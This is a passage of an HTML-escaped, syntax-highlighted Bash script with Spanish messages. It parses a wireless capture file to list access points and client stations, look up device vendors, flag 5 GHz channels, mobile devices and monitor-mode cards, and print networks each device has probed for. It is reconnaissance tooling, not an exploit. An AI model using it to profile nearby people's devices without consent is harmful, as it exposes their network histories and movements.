        &lt;span class=&quot;nv&quot;&gt;MAC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fullMAC&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/ //g'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/-//g'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/://g'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c1-6&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
    
        &lt;span class=&quot;nv&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; 1 ^&lt;span class=&quot;nv&quot;&gt;$MAC&lt;/span&gt; ./oui.txt&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
            &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Vendor: &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 3&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else
            &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Vendor: &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[3mInformación no encontrada en la base de datos&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0m&quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;fi
    
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;is5ghz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;','&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 4 | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'36|40|44|48|52|56|60|64|100|104|108|112|116|120|124|128|132|136|140'&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
    
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$is5ghz&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
            &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0;31mOpera en 5 GHz!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0m&quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;fi
    
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;printonce&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Estaciones:&quot;&lt;/span&gt;
    
        &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; line2 &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
    
            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;clientsMAC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$line2&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fullMAC&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$clientsMAC&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
    
                if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$printonce&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
                    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$printonce&lt;/span&gt;
                    &lt;span class=&quot;nv&quot;&gt;printonce&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;fi
    
                &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t\t\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0;32m&quot;&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$clientsMAC&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;','&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 1&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0m&quot;&lt;/span&gt;
                &lt;span class=&quot;nv&quot;&gt;MAC2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$clientsMAC&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/ //g'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/-//g'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/://g'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c1-6&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
    
                &lt;span class=&quot;nv&quot;&gt;result2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; 1 ^&lt;span class=&quot;nv&quot;&gt;$MAC2&lt;/span&gt; ./oui.txt&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
                    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t\t\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Vendor: &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 3&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
                    &lt;span class=&quot;nv&quot;&gt;ismobile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$result2&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Olivetti|Sony|Mobile|Apple|Samsung|HUAWEI|Motorola|TCT|LG|Ragentek|Lenovo|Shenzhen|Intel|Xiaomi|zte'&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
                    &lt;span class=&quot;nv&quot;&gt;warning&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$result2&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ALFA|Intel'&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ismobile&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
                        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t\t\t\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0;33mEs probable que se trate de un dispositivo móvil&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0m&quot;&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;fi
    
                    if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$warning&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
                        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t\t\t\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0;31;5;7mEl dispositivo soporta el modo monitor&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0m&quot;&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;fi
    
                else
                    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t\t\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Vendor: &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[3mInformación no encontrada en la base de datos&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0m&quot;&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;fi
    
                &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;probed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$line2&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;','&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 7&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
    
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$probed&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;A-Za-z0-9_&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;-]+&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
                    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t\t\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Redes a las que el dispositivo ha estado asociado: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$probed&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;fi        
            fi
        done&lt;/span&gt; &amp;lt; &amp;lt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'([A-Za-z0-9._: @\(\)\\=\[\{\}\&quot;%;-]+,){5} ([A-Z0-9:]{17})|(not associated)'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$FILE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        
    &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; &amp;lt; &amp;lt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'([A-Za-z0-9._: @\(\)\\=\[\{\}\&quot;%;-]+,){14}'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$FILE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
    
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0;36m&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[1mEstaciones no asociadas:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0m&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; line2 &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
    
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;clientsMAC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$line2&lt;/span&gt;  | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;','&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 1&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
    
        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0;31m&quot;&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$clientsMAC&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;','&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 1&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0m&quot;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;MAC2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$clientsMAC&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/ //g'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/-//g'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/://g'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c1-6&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
    
        &lt;span class=&quot;nv&quot;&gt;result2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; 1 ^&lt;span class=&quot;nv&quot;&gt;$MAC2&lt;/span&gt; ./oui.txt&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
            &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Vendor: &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 3&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;ismobile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$result2&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Olivetti|Sony|Mobile|Apple|Samsung|HUAWEI|Motorola|TCT|LG|Ragentek|Lenovo|Shenzhen|Intel|Xiaomi|zte'&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;warning&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$result2&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ALFA|Intel'&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ismobile&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
